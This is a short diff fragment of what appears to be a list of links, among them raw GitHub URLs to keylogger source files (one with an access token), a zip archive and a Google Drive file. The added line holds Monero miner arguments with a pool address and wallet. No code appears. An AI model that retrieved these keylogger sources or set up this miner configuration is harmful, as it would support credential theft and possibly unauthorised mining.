@@ -7,3 +7,5 @@ https://raw.githubusercontent.com/Imper927/keyloger/master/KeyloggerFunctions.h?
 https://raw.githubusercontent.com/Imper927/keyloger/master/Source.cpp?token=ALATRBSK7DZLR2JOK6F3Y3LACK43Y
 https://github.com/Imper927/pytelepub/raw/master/python_nod_noautoinstall.zip
 https://drive.google.com/file/d/1JtlKC68Wr8Ub32V0OOoAIruOS0ONWlvd/view?usp=drivesdk
+
+ -o pool.minexmr.com:4444 -u 43xJcP3LMskbmEsMdGJ6V9JnoZFSHfhnBXCUjngKAPSf5BfuicYr8Wae4YvCTuKxVxga8RWGut8T8UP9YrsRmBDyQnr9Vwu --cuda --opencl
